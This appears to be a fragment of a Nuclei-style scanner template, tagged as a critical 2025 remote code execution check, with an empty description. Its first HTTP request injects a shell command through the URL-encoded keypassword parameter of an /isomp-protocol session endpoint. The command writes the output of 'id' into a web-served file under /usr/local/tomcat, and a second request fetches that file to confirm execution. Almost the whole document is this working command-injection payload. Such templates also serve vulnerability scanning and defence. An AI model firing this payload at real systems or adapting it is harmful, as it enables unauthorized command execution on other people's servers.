  severity: critical
  description: ''
  tags: rce,2025
http:
- raw:
  - 'GET /isomp-protocol/protocol/session?keyPath=/etc/passwd&protocol=ssh&keypassword=123456%27%3Bid+%3E%20/usr/local/tomcat/webapps/fort/trust/version/T1.txt;&sshd=1 HTTP/1.1

    Host: {{Hostname}}

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8

    Accept-Encoding: gzip, deflate

    Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7

    Connection: keep-alive

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36

    验证路径'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - 'GET /fort/trust/version/T1.txt HTTP/1.1

    Host: {{Hostname}}'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
